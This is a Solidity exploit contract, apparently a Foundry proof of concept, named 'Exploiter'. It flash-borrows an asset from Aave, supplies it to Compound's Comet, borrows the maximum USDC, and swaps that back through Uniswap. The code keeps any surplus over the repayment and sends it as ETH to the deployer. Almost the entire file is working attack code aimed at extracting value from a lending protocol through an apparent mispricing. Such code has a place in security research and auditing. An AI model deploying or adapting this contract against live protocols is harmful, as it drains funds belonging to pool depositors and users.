// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/console.sol";

import {IPoolAddressesProvider} from "../lib/aave-v3-core/contracts/interfaces/IPoolAddressesProvider.sol";
import {CometUtils} from "./CometUtils.sol";
import {FlashloanUtils} from "./FlashloanUtils.sol";

interface ERC20 {
    /**
     * @notice Gets the balance of the specified address
     * @param owner The address from which the balance will be retrieved
     * @return The balance
     */
    function balanceOf(address owner) external view returns (uint256);

    /**
     * @notice Approve `spender` to transfer up to `amount` from `src`
     * @dev This will overwrite the approval amount for `spender`
     *  and is subject to issues noted [here](https://eips.ethereum.org/EIPS/eip-20#approve)
     * @param spender The address of the account which may transfer tokens
     * @param amount The number of tokens that are approved (-1 means infinite)
     * @return Whether or not the approval succeeded
     */
    function approve(address spender, uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);
}

interface IWETH9 is ERC20 {
    function deposit() external payable;

    function withdraw(uint wad) external;
}

interface IV3SwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    /// @notice Swaps `amountIn` of one token for as much as possible of another token
    /// @dev Setting `amountIn` to 0 will cause the contract to look up its own balance,
    /// and swap the entire amount, enabling contracts to send tokens before calling this function.
    /// @param params The parameters necessary for the swap, encoded as `ExactInputSingleParams` in calldata
    /// @return amountOut The amount of the received token
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

// TODO contract verification
// TODO fix market bots

contract Exploiter is FlashloanUtils, CometUtils {
    error NoLiquidity();
    error NoProfit();
    uint256 public constant MAX_INT =
        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;

    IWETH9 internal weth;
    ERC20 internal usdc;
    IV3SwapRouter internal router;
    address payable internal exploiter;

    constructor(
        IPoolAddressesProvider _provider,
        address _weth,
        address _usdc,
        address _comet,
        address _router
    ) CometUtils(_comet) FlashloanUtils(_provider) {
        weth = IWETH9(_weth);
        usdc = ERC20(_usdc);
        router = IV3SwapRouter(_router);
        exploiter = payable(msg.sender);
    }

    function flashloan(address _asset, uint256 _amount) public {
        bytes memory params;
        POOL.flashLoanSimple(
            address(this),
            address(_asset),
            _amount,
            params,
            uint16(1)
        );
    }

    function withdrawEth() external payable {
        // Convert WETH
        uint256 wethBalance = weth.balanceOf(address(this));
        weth.withdraw(wethBalance);

        (bool sent, ) = exploiter.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }


    /**
     * @notice Executes an operation after receiving the flash-borrowed asset
     * @dev Ensure that the contract can return the debt + premium, e.g., has
     *      enough funds to repay and has approved the Pool to pull the total amount
     * @param asset The address of the flash-borrowed asset
     * @param amount The amount of the flash-borrowed asset
     * @return True if the execution of the operation succeeds, false otherwise
     */
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata
    ) external returns (bool) {
        // Deposit asset to compound
        console.log("FLASH BORROWED");
        console.log(amount);
        console.log("PREMIUM");
        console.log(premium);
        uint256 repayment = amount + premium;
        console.log("AMOUNT TO REPAY");
        console.log(repayment);

        ERC20 loanedAsset = ERC20(asset);

        // Deposit loaned asset into Comet
        loanedAsset.approve(address(comet), MAX_INT);
        comet.supply(asset, amount);

        // Borrow USDC
        // uint256 borrowable = (getBorrowable(address(this)) * 9999) / 10000;
        uint256 borrowable = getBorrowable(address(this));
        comet.withdraw(comet.baseToken(), borrowable);

        uint256 usdcBalance = usdc.balanceOf(address(this));

        console.log("BORROWED FROM COMET");
        console.log(usdcBalance);

        // Sell USDC for Original Asset
        usdc.approve(address(router), MAX_INT);


        IV3SwapRouter.ExactInputSingleParams memory swapParams = IV3SwapRouter
            .ExactInputSingleParams(
                address(usdc),
                asset,
                uint24(3000),
                address(this),
                MAX_INT,
                usdcBalance,
                0,
                uint160(0)
            );

        router.exactInputSingle(swapParams);

        uint256 assetBalance = loanedAsset.balanceOf(address(this));

        console.log("RECEIVED");
        console.log(assetBalance);

        if (assetBalance > repayment) {
            uint256 profit = assetBalance - repayment;
            console.log("PROFIT");
            console.log(profit);

            if (asset != address(weth)) {
                loanedAsset.approve(address(router), MAX_INT);
                swapParams = IV3SwapRouter.ExactInputSingleParams(
                    asset,
                    address(weth),
                    uint24(3000),
                    address(this),
                    MAX_INT,
                    assetBalance - repayment,
                    0,
                    uint160(0)
                );

                router.exactInputSingle(swapParams);
            }

            loanedAsset.approve(address(POOL), repayment);

            uint256 wethBalance = weth.balanceOf(address(this));

            console.log("RECOVERED WETH");
            console.log(wethBalance);
        } else {
            console.log("NO PROFIT");
            revert NoProfit();
        }
        return true;
    }

    receive() external payable {}
}
